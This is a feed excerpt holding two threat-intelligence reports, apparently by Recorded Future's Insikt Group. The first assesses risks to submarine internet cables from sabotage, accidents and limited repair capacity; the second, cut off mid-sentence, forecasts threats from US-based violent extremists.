            <description><![CDATA[Explore the rising threats to global submarine cable networks amid escalating geopolitical tensions, sabotage incidents, and limited repair capacity. Discover essential resilience strategies and risk mitigation measures.]]></description>
            <content:encoded><![CDATA[<h2 id="executive-summary">Executive Summary</h2><p>Events over the last eighteen months indicate that the risk environment for submarine cables has very likely escalated, and the threat of state-sponsored malicious activity targeting submarine cable infrastructure is likely to rise further amid heightened geopolitical tensions. Insikt Groups assessment of the current risk environment for submarine cables aligns with the findings of our 2023 assessment, which highlighted the convergence of geopolitical, physical, and cyber threats. Based on an analysis of 44 publicly reported cable damages occurring in 32 distinct groupings in 2024 and 2025 (Appendix A), Insikt Group assesses that three factors in the submarine cable ecosystem  lack of redundancy in cable networks, lack of diversity of cable routes, and limited global repair capacity  very likely increase the likelihood of significant outages from damages. Regions with low redundancy, such as parts of West and Central Africa, isolated Pacific islands, and certain secondary European routes, are more likely to suffer disproportionate impact from cable damage, especially when geopolitical tensions coincide with infrastructure constraints. </p><p>While accidents will very likely continue to cause the majority of day-to-day interruptions, recent incidents in the Baltic Sea and around Taiwan indicate that submarine cable systems remain vulnerable to threats such as anchor dragging, which states can use as a low-sophistication tactic to target adversaries critical infrastructure while maintaining plausible deniability. Insikt Group identified four incidents involving eight distinct cable damages in the Baltic Sea and five incidents involving five distinct cable damages around Taiwan in 2024 and 2025. At least five of these nine incidents were attributed to ships dragging their anchors, including four Russia- or China-linked vessels operating under suspicious circumstances or with opaque ownership structures, although the resulting investigations have highlighted the difficulty of attributing cable cuts to state-sponsored sabotage. Such campaigns attributed to Russia in the North AtlanticBaltic region and China in the western Pacific are likely to increase in frequency as tensions rise, leveraging deniable tactics in both shallow and deep water to apply political pressure without overt escalation.</p><p>Without a significant expansion of dedicated repair vessels, repair capacity is very likely to lag behind demand, pushing median restoration times beyond the current 40day benchmark. National permitting delays and conflict zone access restrictions will likely extend repair times further, making streamlined diplomatic clearance processes an increasingly critical element of submarine cable resilience. Satellite and microwave links will almost certainly remain partial stopgaps, restoring only a fraction of lost bandwidth during major outages. To mitigate these challenges, joint public-private partnerships investing in repair and maintenance capabilities, improving real-time monitoring and security measures around submarine cable infrastructure, and conducting comprehensive stress tests are critical to improving resilience and guarding against a low-probability but high-impact event in which damages to multiple cables cause prolonged connectivity issues.</p><h2 id="key-findings">Key Findings</h2><ul><li>Insikt Group identified a total of 44 publicly reported cable damages in 2024 and 2025 occurring in 32 distinct groupings. Unknown causes accounted for the largest number of damages (31%), followed by anchor dragging (25%) and seismic activity or other natural phenomena (16%).</li><li>Of the identified cable damages, three caused significant and prolonged outages. These cases indicate that three factors  lack of redundancy, lack of diversity of cable routes, and limited repair capacity  very likely raise the risk of severe impact from damages to submarine cables.</li><li>Insikt Group identified four incidents in the Baltic Sea involving eight distinct submarine cable damages and five incidents around Taiwan involving five distinct submarine cable damages in 2024 and 2025, four of which involved China- or Russia-linked vessels with opaque ownership or suspicious maneuvers near the damaged cables. </li><li>Geopolitical tensions  namely, Russias war against Ukraine and Chinas coercive actions toward Taiwan  very likely remain the primary drivers of state-linked sabotage activity targeting submarine cables.</li><li>Joint public-private partnerships promoting investment in cable repair and maintenance capabilities, enhancing security and surveillance of critical submarine infrastructure, and improving resilience in current and future cable networks will be critical to addressing rising threats to cable infrastructure.</li></ul><h2 id="background">Background</h2><p>There are <a href="https://submarine-cable-map-2025.telegeography.com/">currently</a> 597 subsea cables in operation or under construction as of April 2025, <a href="https://submarine-cable-map-2024.telegeography.com/">compared</a> to 559 subsea cables in 2024. These cables account for an <a href="https://www.itu.int/digital-resilience/submarine-cables/">estimated</a> 99% of international data traffic, representing critical infrastructure underpinning global telecommunications and financial flows. In 2024, 24 new cable systems <a href="https://subtelforum.com/submarine-telecoms-industry-report/">came</a> online, according to the Submarine Telecoms Forum (SubTel Forum)  eight in the Europe-Middle East-Africa region, six in Oceania, four in the Indian Ocean, four in the Americas, and two transpacific systems. </p><p>Among commercial suppliers of cable systems, three companies  Frances Alcatel, the USs SubCom, and Japans NEC  <a href="https://subtelforum.com/submarine-telecoms-industry-report/">lead</a> in the number of systems delivered, kilometers of cable produced, and future systems planned, although Chinas HMN Technologies (Hengtong) is playing an increasing role. Between 2020 and 2024, Alcatel delivered 23 systems, SubCom delivered thirteen, NEC ten, and HMN seven. Alcatel, the largest player, is also involved in nine planned future cable systems, representing 39% of future projects, while NEC is involved in four (17%) and SubCom two (9%). </p><p>There are approximately 80 vessels globally <a href="https://subtelforum.com/submarine-telecoms-industry-report/">dedicated</a> to maintaining and expanding submarine cable infrastructure, with the United Kingdoms (UK) Global Marine Systems (13%), Frances Orange Marine (13%), SubCom (11.6%), Alcatel Submarine Networks (ASN) (10%) and Malaysias Optic Marine Services (10%) owning the most vessels.</p><p><img src="https://cms.recordedfuture.com/uploads/submarine_cables_001_b4ea3f77e6.png" alt="submarine-cables-001.png"><em>Figure 1: Cable ship fleet distribution by company (Source: <a href="https://subtelforum.com/submarine-telecoms-industry-report/">Submarine Telecoms Forum Industry Report 20242025: Issue 13</a>)</em></p><p>Damage to submarine cables is not uncommon, with an average of 150 to 200 faults <a href="https://www.itu.int/en/mediacentre/Pages/PR-2024-11-29-advisory-body-submarine-cable-resilience.aspx">occurring</a> globally each year, according to the International Cable Protection Committee (ICPC). Most of these faults never <a href="https://blog.telegeography.com/what-to-know-about-submarine-cable-breaks">reach</a> the threshold of public reporting, since the majority do not cause detectable issues due to the availability of alternate routes for traffic. From 2015 to 2024, SubTel Forum <a href="https://subtelforum.com/submarine-telecoms-industry-report/">identified</a> a total of 237 publicized cable fault incidents globally  likely a fraction of the total cable faults  the vast majority of which were attributable to human activities, namely fishing and anchor dragging. Regionally, the AustralAsia region <a href="https://subtelforum.com/submarine-telecoms-industry-report/">accounted</a> for 36.3% of all reported faults during this period, making it the most fault-prone area, followed by Europe, the Middle East, and Africa (28.7%) and the Americas (20.3%) The ICPC <a href="https://www.iscpc.org/publications/submarine-cable-protection-and-the-environment/">reports</a> that the most common cause of cable damage is a ship anchor or fishing equipment contacting a cable in depths of less than 200 meters. Undersea abrasion and natural phenomena  such as underwater rockslides and seismic activity  <a href="https://www.kentik.com/blog/diving-deep-into-submarine-cables-undersea-lifelines-of-internet-connectivity/">account</a> for approximately 10% of faults. </p><p>While cable faults are relatively common, they require significant resources to repair; the ICPC <a href="https://www.csis.org/analysis/safeguarding-subsea-cables-protecting-cyber-infrastructure-amid-great-power-competition">reports</a> that cable repairs average between $1 and $3 million, require specialized cable ships with highly trained crews, and can take months to complete. </p><h2 id="submarine-cable-risk-environment">Submarine Cable Risk Environment</h2><p>Submarine cable systems very likely continue to face an escalating risk environment, driven in part by increasing geopolitical tensions  aligning with our July 2023 <a href="https://www.recordedfuture.com/research/escalating-global-risk-environment-submarine-cables">assessment</a>. In 2024, SubTel Forum  a leading industry platform for submarine cable analysis and reporting  reported 46 incidents, the highest figure since it began publishing data on subsea cable faults in 2013 and a sharp uptick from the fifteen reported in 2023. This corresponds to heightened public awareness of submarine cable vulnerabilities amid several recent high-profile damages and related concerns about intentional malicious actions, such as sabotage  although the increase may be partially attributable to increased reporting on subsea cable faults, as opposed to strictly reflecting an increase in incidents. However, most recent incidents have not resulted in prolonged connectivity disruptions. </p><p>An assessment of the three most impactful damages in 2024 and 2025  located in the Red Sea, West Africa, and South Africa  indicates that the greatest threat to submarine cables is almost certainly where damages occur in areas with limited redundancy and repair capacity, regardless of whether the result of malicious targeting driven by geopolitical interests, unintentional human activity, or natural phenomena.</p><h3 id="most-impactful-cable-damages-of-20242025">Most Impactful Cable Damages of 20242025</h3><p>Insikt Group identified 44 publicly reported submarine cable damages occurring in 32 groupings in 2024 and 2025 (<strong>Appendix A</strong>). Of these, three cases caused damage to multiple submarine internet cables resulting in substantial and prolonged disruption to internet and telecommunications traffic. In each case, disruption to services resulted from damages to multiple submarine cables at once, with the most impacted countries lacking reliable alternative routes for traffic, exacerbated by limited repair capabilities and permitting issues that prolonged repair timelines. </p><ul><li>In February 2024, a UK-owned vessel struck by a Houthi-fired missile sank in the Red Sea, damaging the Asia Africa Europe-1 (AAE-1), Europe India Gateway (EIG), and SEACOM cables and <a href="https://www.kentik.com/blog/what-caused-the-red-sea-submarine-cable-cuts/">disrupting</a> 25% of traffic between Asia, Europe, and the Middle East. According to Hong Kong telecommunications company HGC Global Communications, the damage <a href="https://www.hgc.com.hk/press-releases/statement-hgc-global-communications-takes-swift-action-in-response-to-submarine-cable-damage-in-the-red-sea">caused</a> a significant impact on communication networks in the Middle East. </li><li>In March 2024, an underwater rock slide <a href="https://www.internetsociety.org/resources/doc/2024/2024-west-africa-submarine-cable-outage-report/">damaged</a> four submarine cables off West Africa: the West African Cable System (WACS), Africa Coast to Europe (ACE), MainOne, and SAT-3 cables. NetBlocks reported disruptions to internet connections in at least sixteen Central and West African countries, with disruptions to mobile payments and cloud applications for several days. CloudFlare <a href="https://blog.cloudflare.com/undersea-cable-failures-cause-internet-disruptions-across-africa-march-14-2024/">reported</a> a significant impact on a total of thirteen countries. In Liberia, disruptions lasted more than twelve hours. The outage also <a href="https://punchng.com/submarine-cable-repairs-may-last-five-weeks-mainone/">left</a> multiple Nigerian banks offline, severely <a href="https://www.bbc.com/news/world-africa-68569022">impacted</a> connectivity in Ghana, and <a href="https://subtelforum.com/8m-to-restore-subsea-cable-services/">incurred</a> estimated repair costs of $8 million. </li><li>In May 2024, damage to two cables off the coast of South Africa  SEACOM and the Eastern Africa Submarine System (EASSy)  significantly <a href="https://www.internetsociety.org/resources/doc/2024/2024-east-africa-submarine-cable-outage-report/">reduced</a> connectivity between East and South Africa, and caused internet outages for Kenya and several other East African countries. According to <a href="https://x.com/netblocks/status/1790043208811954435">Netblocks</a>, the cut disrupted internet services in twelve countries, with Tanzania, Mozambique, and Malawi particularly affected.</li></ul><h3 id="risk-factors-for-submarine-cable-systems">Risk Factors for Submarine Cable Systems</h3><p>Three primary factors  lack of redundancy, lack of diversity of cable routes, and limited repair capacity  very likely raise the likelihood of severe outages caused by damage to submarine cables. Additionally, permitting issues stemming from different regulatory environments and geopolitical tensions can extend the timeline for cable repairs, as can kinetic conflicts in the vicinity of cable breaks. </p><h4 id="lack-of-redundancy">Lack of Redundancy</h4><p><strong>Jurisdictions with limited alternate options to reroute traffic are most vulnerable to prolonged or significant disruptions.</strong> Following the May 2024 damages to SEACOM and EASSy, Kenya rerouted traffic to the TEAMS cable, with Safaricom and Airtel reporting they had activated alternative connectivity, but Tanzania experienced greater disruption due to its fewer connectivity options (<strong>Figure 2</strong>). In this case, the earlier February 2024 Red Sea damages further limited alternate options for connectivity, with Microsoft <a href="https://www.connectingafrica.com/connectivity/multiple-cable-failures-impact-africa-s-internet">stating</a> that the two incidents together had reduced the total network capacity for most of Africas regions. By contrast, Cloudflare <a href="https://blog.cloudflare.com/resilient-internet-connectivity-baltic-cable-cuts/">reported</a> that two cable cuts in November 2024 in the Baltic Sea  the BCS East-West Interlink connecting Sweden and Lithuania, and the C-Lion1 cable connecting Finland and Germany  resulted in little-to-no observable impact to the affected countries  in large part because of the significant redundancy and resilience of Internet infrastructure in Europe. Highlighting the importance of redundancy measures, the European Commission <a href="https://digital-strategy.ec.europa.eu/en/library/recommendation-security-and-resilience-submarine-cable-infrastructures">reported</a> in 2024 that many islands in the Union, including the three island Member States [Cyprus, Ireland, and Malta], as well as the EU outermost regions and overseas countries and territories, are almost entirely dependent on such submarine cables for intra-Union communications, indicating a likely higher level of vulnerability. </p><p><img src="https://cms.recordedfuture.com/uploads/submarine_cables_002_ecf904bf88.jpg" alt="submarine-cables-002.jpg"><em>Figure 2: Impact of May 2024 SEACOM and EASSy cable outages in East Africa (Source: <a href="https://x.com/netblocks/status/1789660992902730235">NetBlocks</a>)</em></p><p><strong>While satellites provide edge connectivity and connect locations that do not have easy access to physical infrastructure, they account for a small amount of overall global capacity and typically cannot replace fiber-optic submarine cables, which also <a href="https://theconversation.com/in-our-wi-fi-world-the-internet-still-depends-on-undersea-cables-49936">move</a> large amounts of data faster and more cheaply.</strong> TeleGeography <a href="https://www2.telegeography.com/submarine-cable-faqs-frequently-asked-questions">reports</a> that cables can carry far more data at far less cost than satellites, and only a small percentage of intercontinental data traffic is transmitted via satellite, according to <a href="https://blog.cloudflare.com/undersea-cable-failures-cause-internet-disruptions-across-africa-march-14-2024/">Cloudflare</a>. For example, the US Federal Communications Commission (FCC) <a href="https://www.fcc.gov/circuit-status-report">reports</a> that satellites account for just 0.37% of all US international capacity. According to the <a href="https://www.iscpc.org/information/frequently-asked-questions/">ICPC</a>, a trans-pacific fibre-optic call need only travel about 5,000 miles point-to-point, compared to a satellite call, which must travel 22,235 miles from the Earth to a satellite and then another 22,235 back. Illustrating this, a backup microwave system was <a href="https://www.enisa.europa.eu/publications/undersea-cables">activated</a> following damages to two submarine cables connecting Taiwan and the Matsu Islands in February 2023, but only restored an estimated 5% of the bandwidth that the cables had provided, with full internet access not restored until April 2023.</p><h4 id="lack-of-diversity-of-cable-routes">Lack of Diversity of Cable Routes</h4><p><strong>Deploying submarine cables along similar geographic routes very likely increases systemic risk by creating single points of failure.</strong> Countries with multiple submarine cables routed along varying geographic routes are more insulated from major connectivity losses; conversely, those with fewer connecting cables, placed in close proximity to each other, are almost certainly more susceptible to multiple cable damages and associated disruptions. Recent incidents of damage to multiple cables at once indicate that threat actors could attempt to exploit the concentration of cables along similar routes in an effort to cause prolonged outages across a geographic area. For example, the Red Sea cable cuts in February 2024, detailed above, illustrated the importance of route diversity. The March 2024 damages to four cables off West Africa, which all occurred due to an underwater landslide in the Le Trou Sans Fond canyon off of Cte dIvoire, <a href="https://www.internetsociety.org/resources/doc/2024/2024-west-africa-submarine-cable-outage-report/">illustrated</a> how a concentration of cables at one point can make multiple cables susceptible to human-made threats or, as in this case, natural phenomena (<strong>Figure 3</strong>). Similarly, Egypt is a critical internet chokepoint through which multiple submarine cables <a href="https://www.kentik.com/blog/outage-in-egypt-impacted-aws-gcp-and-azure-interregional-connectivity/">connecting</a> Europe, Africa, and Asia run; the vulnerabilities associated with this arrangement were <a href="https://blog.cloudflare.com/aae-1-smw5-cable-cuts/">apparent</a> <a href="https://www.datacenterdynamics.com/en/news/aae-1-cable-cut-causes-widespread-outages-in-europe-east-africa-middle-east-and-south-asia/">following</a> June 2022 damages to both the AAE-1 and the SeaMeWe-5 cables. In December 2024, the US Department of Homeland Security <a href="https://www.dhs.gov/sites/default/files/2024-12/24_1218_scrc_Priorities-for-DHS-Engagement-on-Subsea-Cable-Security-Resilience_18-Dec-24.pdf">noted</a> that while incidents in geographic chokepoints are relatively rare, each one brings much-needed attention to the vulnerability of similarly concentrated cables around the world.</p><p><img src="https://cms.recordedfuture.com/uploads/submarine_cables_003_00ad2f88f0.png" alt="submarine-cables-003.png"><em>Figure 3: Multiple cables convene at Abidjan, Cte dIvoire (Source: <a href="https://www.fiberatlantic.com/cls/lVB5D9UVvZQ5HK3cexaE">Fiber Atlantic</a>)</em></p><p><strong>The concentration of submarine cables at a single cable landing station <a href="https://blog.telegeography.com/why-does-diversity-matter-for-submarine-cables">increases</a> the likelihood that damage to or near a landing site will impact multiple cables.</strong> These stations <a href="https://www.itu.int/en/ITU-D/Regional-Presence/AsiaPacific/SiteAssets/Pages/Events/2017/Submarine%20Cable/submarine-cables-for-Pacific-Islands-Countries/Cable%20Landing%20Stations%20SNCC.pdf">provide</a> multiple functions, including supplying power to the cable and connecting it to terrestrial networks, and their locations are often <a href="https://www.kentik.com/blog/diving-deep-into-submarine-cables-undersea-lifelines-of-internet-connectivity/">chosen</a> <a href="https://www.nato-pa.int/download-file?filename=/sites/default/files/2023-04/032%20STC%2023%20E%20-%20CRITICAL%20MARITIME%20INFRASTRUCTURE%20-%20FRIDBERTSSON%20REPORT.pdf">based</a> on access to existing infrastructure or regulatory factors, rather than because they offer particularly high protection from natural disasters or physical threats, such as sabotage or surveillance. As a result, cables frequently cluster around or at the same landing site  <a href="https://www.atlanticcouncil.org/wp-content/uploads/2021/09/Cyber-defense-across-the-ocean-floor-The-geopolitics-of-submarine-cable-security.pdf">raising</a> the threat that sabotage or espionage operations could impact multiple cables at once by targeting landing stations. For example, according to the US FCC, landing sites on the southeastern US coast are <a href="https://transition.fcc.gov/bureaus/pshs/advisory/csric5/WG4A_Final_091416.pdf">clustered</a> in three primary locations in Florida, with nearly all landing sites developed to support multiple submarine cables. In October 2022, cybersecurity company Zscaler <a href="https://trust.zscaler.com/zscloud.net/posts/12256">warned</a> that cuts to multiple cables at landing stations in Marseille linking the city to Milan, Barcelona, and Lyon impacted major cables with connectivity to Asia, Europe, US and potentially other parts of the world. In August 2023, the European Union Agency for Cybersecurity (ENISA) <a href="https://www.enisa.europa.eu/publications/undersea-cables">reported</a> that landing stations represent a weak point in the ecosystem due to their vulnerability to espionage attacks, deliberate power cuts, sabotage attacks with explosives, or even missile attacks in the case of a military conflict.</p><h4 id="limited-repair-capacity-poses-long-term-problem">Limited Repair Capacity Poses Long-Term Problem</h4><p><strong>Repair capacity, which continues to lag behind the expansion of submarine cable networks, almost certainly represents an underappreciated point of vulnerability in the submarine cable ecosystem.</strong> As cable systems have expanded dramatically, investment in ships that can service these cables has lagged behind, resulting in the growth of cable systems outpacing repair capacity. Most of these vessels are therefore focused on laying new cable systems, <a href="https://www.theverge.com/c/24070570/internet-cables-undersea-deep-repair-ships">constraining</a> their ability to respond immediately to cable faults. According to <a href="https://www.enisa.europa.eu/publications/undersea-cables">ENISA</a>, given the complex nature of repairs and limited repair capacity, a coordinated attack against multiple subsea cables could have a major impact on global internet connectivity. For example, the Lon Thvenin, a cable repair ship docked in Cape Town, South Africa, was the only vessel dedicated to serving Africa at the time of the March 2024 cable outages, extending the repair timeline. In February 2023, all five of Vietnams operational undersea cables <a href="https://e.vnexpress.net/news/news/vietnam-s-undersea-cable-malfunctions-right-after-getting-fixed-4623749.html">suffered</a> partial or total damage at the same time, <a href="https://e.vnexpress.net/news/news/despite-promises-of-no-stagnation-vietnam-s-internet-access-struggles-during-peak-hours-4570205.html">resulting</a> in the loss of 75% of its data transmission capacity. With nearby ships busy, repairs on all cables were not fully <a href="https://vietnamnet.vn/en/repairs-completed-on-five-broken-undersea-cables-linked-to-vietnam-2223445.html">completed</a> until late November 2023, and telecommunications firms were <a href="https://manoa.hawaii.edu/indopacificaffairs/article/entangled-southeast-asia-and-the-geopolitics-of-undersea-cables/#:~:text=In%202022%20and%202023%2C%20all,transportation%20to%20ensure%20stable%20connections.">forced</a> to purchase spare terrestrial capacity to help stabilize connections. Reflecting concerns regarding the limited availability of repair vessels, the US <a href="https://www.federalregister.gov/documents/2021/01/05/2020-29159/request-for-applications-to-be-considered-for-enrollment-in-the-cable-security-fleet">established</a> the Cable Security Fleet in 2020 with two <a href="https://www.csis.org/analysis/safeguarding-subsea-cables-protecting-cyber-infrastructure-amid-great-power-competition">dedicated</a> US-flagged cable repair ships (the CS Dependable and CS Decisive) to speed repairs to submarine cables relevant to US national security. </p><p><strong>Unless significant investments are made in streamlining repair processes and expanding cable ship repair capacity, repair times are likely to continue trending upward.</strong> According to <a href="https://subtelforum.com/submarine-telecoms-industry-report/">SubTel Forum</a>, the average repair time for the restoration of cable faults has risen from 2015 to 2024, with the average repair time in 2023 consisting of 40 days. Vietnams five submarine cable systems, which account for most of its international bandwidth, <a href="https://subtelforum.com/aae-1-and-apg-cable-disruptions-impact-vietnams-internet/">experience</a> an average of fifteen incidents annually; prior to 2022, repairs lasted one to two months per incident, but have recently lasted longer, extending disruptions.This is almost certainly a result of the increasing gap in the rates of subsea cable infrastructure expansion and stagnating repair capabilities. </p><h4 id="regulatory-factors-conflict-and-territorial-disputes-likely-to-prolong-repair-timelines">Regulatory Factors, Conflict, and Territorial Disputes Likely to Prolong Repair Timelines</h4><p><strong>Regulatory hurdles, such as complex and lengthy permitting processes for repair ships that vary by national territory, likely prolong repair timelines, exacerbating the impact of limited repair capacity. Cable damage in areas subject to territorial disputes and ongoing kinetic conflicts almost certainly increases the prospect of prolonged outages due to the denial of access to repair vessels.</strong> The International Institute for Strategic Studies <a href="https://www.iiss.org/cyber-power-matrix/submarine-cables-the-achilles-heel-of-cyberspace-in-the-asia-pacific/">reports</a> that repairs in the Asia-Pacific region take up to 30 days on average from notification of an incident, compared to fifteen in North America, due to more stringent permitting requirements. For example, repairs to April 2024 damages to the SeaMeWe-5 cable in Indonesian waters, which <a href="https://www.capacitymedia.com/article/2d5m1eo5yohwx2zl557uo/news/indonesian-policy-delays-sea-me-we-5s-repair">reduced</a> Bangladeshs internet capacity by a third, were not <a href="https://www.facebook.com/photo?fbid=885023603650209&set=a.308673981285177">completed</a> until June 28, 2024, as Jakartas cabotage policy <a href="https://www.capacitymedia.com/article/2d5m1eo5yohwx2zl557uo/news/indonesian-policy-delays-sea-me-we-5s-repair">delayed</a> repairs for several weeks. In March 2024, telecommunications provider SEACOM <a href="https://itweb.africa/content/O2rQGMAEyPGMd1ea">reported</a> that it would likely take longer than expected to repair three cables in the Red Sea damaged by a ship hit by Houthi strikes since permitting could take up to eight weeks to obtain. The Yemeni government <a href="https://www.marineinsight.com/shipping-news/yemens-political-disputes-delay-full-repairs-of-3-submarine-internet-cables-in-the-red-sea/">refused</a> to grant permission to initiate repairs of the damaged AAE-1 cable to the cables operating consortium, which includes telecommunications firm TeleYemen, as one of the firms two branches is under the control of the Houthi group. An investigation of the consortium reportedly <a href="https://gcaptain.com/damaged-subsea-cables-repaired-in-red-sea/">delayed</a> repairs of the AAE-1 until July 2024. Further, SubTel Forum <a href="https://subtelforum.com/houthis-hit-underwater-communications-cables/">reported</a> that ongoing threats posed by the Houthi group likely limited companies that agreed to carry out repairs and incurred high premiums.</p><p>Additionally, amid ongoing territorial disputes between China and the Philippines in the South China Sea, the China Coast Guard (the CCG) has attempted to block Philippine resupply operations to vessels at the Second Thomas Shoal, Scarborough Shoal, and Sabina Shoal. In addition to harassing Philippine vessels, the CCG and other Chinese forces have for decades <a href="https://www.nbr.org/publication/dynamics-of-assertiveness-in-the-south-china-sea-china-the-philippines-and-vietnam-1970-2015/">interfered</a> with vessels from other claimants in the South China Sea, as well as vessels operated by outside powers like the United States. These incidents suggest that Beijing could take similar action to block repair vessels from accessing damaged submarine infrastructure in the event of a potential escalation of tension or outbreak of hostilities around Taiwan. </p><p>To read the entire analysis, <a href="https://go.recordedfuture.com/hubfs/reports/ta-2025-0717.pdf">click here</a> to download the report as a PDF.</p>]]></content:encoded>

            <content:encoded><![CDATA[<p><img src="https://cms.recordedfuture.com/uploads/insikt_group_logo_updated_3_300x48_b5390f4ff2.png" alt="insikt group logo"></p><h2 id="executive-summary">Executive Summary</h2><p>The predominant threats to most public and private sector entities from United States (US)-based domestic violent extremists (DVEs) during the next twelve months will likely come in the form of targeted attacks against personnel and sabotage of facilities. These threats likely surpass the risk of DVE mass-casualty terrorist attacks due to their elevated frequency, success rate, and impact on the targeted entitys operations. While certain categories of homegrown violent extremists (HVEs) and some DVEs will almost certainly continue to plan and threaten mass-casualty attacks, recent high-profile assassinations and assassination attempts in the US have very likely increased the probability of DVEs considering limited-scope methods. Violent extremists have almost certainly glorified the alleged perpetrators of these attacks and promoted narratives suggesting that targeted attacks against high-profile public figures more effectively achieve their political and ideological goals than mass-casualty attacks.</p><p>To support attack plots and bolster their operational footprint in 2025 and early 2026, HVEs and DVEs will almost certainly continue issuing online threats; stalking, harassing, and physically approaching victims; and conducting sabotage, surveillance, disruptive demonstrations, doxing, and swatting. As in previous years, personnel and facilities associated with racial, ethnic, and religious minorities, the LGBTQIA+ community, US federal, state, local, tribal, and territorial government agencies (particularly judicial and law enforcement agencies), specific private industry sectors (defense contractors, healthcare and pharmaceutical companies, financial and insurance agencies), and critical infrastructure providers are at heightened risk from HVE and DVE threat activities during the next twelve months.</p><p>Polarizing geopolitical and domestic political issues  especially conflicts in the Middle East involving Israel, the 2024 fall of the Bashar al-Assad regime in Syria, and US immigration enforcement policies   will almost certainly continue to mobilize HVEs and DVEs during the next twelve months. While expected tactics, techniques, and procedures (TTPs) associated with US violent extremists are unlikely to significantly change in the short term, DVEs and HVEs are very likely to accelerate adoption of new technologies, such as commercially available unmanned aerial vehicles (UAVs), generative artificial intelligence (AI), end-to-end encrypted communications platforms, cryptocurrencies, and 3D printing, to enhance their operational capabilities.</p><p>Rapidly shifting developments in the violent extremist threat landscape in the US and changing priorities of US federal law enforcement and homeland security agencies could place more of the onus on state and local governments and the private sector to manage their own counterterrorism programming. As always, facility security initiatives and hardening soft targets will undoubtedly remain important, but recent incidents and violent extremists growing preference for targeted attacks against high-profile personnel suggest that executive protection is an increasingly crucial aspect of countering violent extremist threats to organizations. Organizations can mitigate threats to executives not only through reactive detection of online threats and negative sentiment campaigns, but also by proactively identifying and removing publicly available information that can be used to target personnel. Physical security teams can query the Recorded Future Intelligence Clouds extensive corpus of sources used by violent extremists to analyze intelligence pertaining to these and other violent extremist threats.</p><h2 id="key-findings">Key Findings</h2><p>During the next twelve months:</p><ul><li>The US will very likely face a heightened threat from violent extremist physical threat activities due to the enduring influence of the Israel-Hamas conflict; geopolitical developments in the Middle East, Central Asia, and Africa favoring foreign terrorist organizations (FTOs); and the increasing ease of access to and use of new and developing technologies.</li><li>While their preferred targets vary, most violent extremist threat actors are almost certainly interested in threatening US federal, state, and local governments. Critical infrastructure providers, defense contractors, and the education, insurance, healthcare, banking, finance, and maritime industry sectors also very likely face heightened risks.</li><li>Islamic State (IS) supporters will very likely represent the most lethal HVE threat to the US, especially if IS experiences a resurgence in Syria following the 2024 fall of the al-Assad government.</li><li>HVEs with a nexus to Hamas, Hezbollah, the Yemeni Houthis, Iraqi Shia militias, or other Axis of Resistance groups are unlikely to carry out attacks in the US, but they likely have increased motivation to do so and access to expanded facilitative resources due to the USs direct involvement in the Iran-Israel conflict.</li><li>The DVE groups that likely pose the largest threat of conducting violent attacks in the US, such as neo-Nazi accelerationists, anti-government/anti-authority violent extremists (AGAAVEs) motivated by political animus, and anarchist violent extremists (AVEs), are likely to increasingly prefer targeted attacks and assassinations over mass-casualty attack plots.</li><li>Militia violent extremists (MVEs), AVEs, and AGAAVEs harboring political grievances due to US domestic political issues will almost certainly physically threaten judges, public officials, business executives, and other highprofile public figures.</li></ul><h2 id="background">Background</h2><p>Insikt Groups forecast is predicated on its assessments of open-source information on the activities of HVEs and DVEs in the US, including the Recorded Future Intelligence Clouds extensive index of HVE and DVE communications on various online platforms. During the past twelve months, Insikt Group researchers curated several hundred HVE and DVE sources, adding them to an extensive index of preexisting sources of this type.</p><p>This report defines homegrown violent extremist, domestic violent extremist, and several categories of HVEs and DVEs based on the US Intelligence Communitys <a href="https://www.dni.gov/files/ODNI/documents/assessments/UnclassSummaryofDVEAssessment-17MAR21.pdf">definitions and categorizations</a> of threat actors. Periodically, this report prefers definitions adopted by Insikt Group subject matter experts for analytic utility, or in instances where the US government has not officially defined a particular phenomenon or movement. A full list of terms and definitions used in this report is available in <strong>Appendix A</strong>.</p><h2 id="homegrown-violent-extremists">Homegrown Violent Extremists</h2><p>HVEs are very likely to carry out physical threat activities targeting US government and law enforcement installations and personnel, public events, large commercial spaces, houses of worship and religious communities, and counter-protestors and demonstrators. US-based IS supporters will very likely present the most lethal violent extremist threat to the US during the next twelve months, and the continued mobilization factor of the Israel-Hamas conflict will almost certainly <a href="https://www.ic3.gov/PSA/2025/PSA250605-2">drive</a> some Americans to provide support for IS, al-Qaeda, and other FTOs (although organizations other than IS and al-Shabaab  al-Qaedas Somalia franchise  very likely lack the infrastructure, personnel, and interest in recruiting US persons).</p><p>However, while sporadic escalations in the Israel-Hamas conflict will almost certainly <a href="https://extremism.gwu.edu/sites/g/files/zaxdzs5746/files/2024-11/Pamphlet_compressed.pdf">influence</a> disruptive protest activities and other physical threats in 2025, most visibly at US universities, threat actors will likely be deterred from overt displays of support for FTOs and plotting mass-casualty attacks due to the almost certain increase in law enforcement resources <a href="https://www.justice.gov/opa/pr/justice-department-announces-launch-joint-task-force-october-7">dedicated</a> to investigating and prosecuting these threats. Instead, extant pro-Hamas networks in the US are very likely to <a href="https://www.justice.gov/usao-dc/pr/justice-department-disrupts-hamas-terrorist-financing-scheme-through-seizure">emphasize</a> covert operations, especially those that finance the organization.</p><p>In addition, the geopolitical climate likely <a href="https://www.reuters.com/world/middle-east/new-orleans-attack-puts-spotlight-islamic-state-comeback-bid-2025-01-03/">favors</a> efforts by IS and al-Qaeda affiliates in the Levant, Central Asia, the Sahel, and the Horn of Africa to expand their territorial holdings, <a href="https://www.dni.gov/files/ODNI/documents/assessments/ATA-2025-Unclassified-Report.pdf">conduct</a> increasingly sophisticated and lethal attacks in their areas of operations, and <a href="https://www.understandingwar.org/backgrounder/islamic-state%E2%80%99s-global-long-game-and-resurgence-syria-poses-evolved-threat-west">develop</a> connections between their operatives and recruitment networks in Western Europe and North America.</p><p>Expanding commercial markets and ease of use of developing technologies  particularly UAVs and cryptocurrencies  are very likely to bolster HVE operations on behalf of a range of FTOs in 2025. US HVEs almost certainly continue to provide financial assistance to IS, al-Qaeda, and Hamas through cryptocurrencies. For example, Hamas has almost certainly <a href="https://www.justice.gov/archives/opa/pr/global-disruption-three-terror-finance-cyber-enabled-campaigns">developed</a> a sophisticated network of cryptocurrency wallets and exchanges it uses to <a href="https://www.justice.gov/usao-dc/pr/justice-department-disrupts-hamas-terrorist-financing-scheme-through-seizure">funnel</a> funds from its international supporters to its operatives in the Palestinian Territories. HVEs are very likely to continue <a href="https://ctc.westpoint.edu/on-the-horizon-the-ukraine-war-and-the-evolving-threat-of-drone-terrorism/">experimenting</a> with these new technologies for <a href="https://ctc.westpoint.edu/printing-terror-an-empirical-overview-of-the-use-of-3d-printed-firearms-by-right-wing-extremists/">applications</a> in 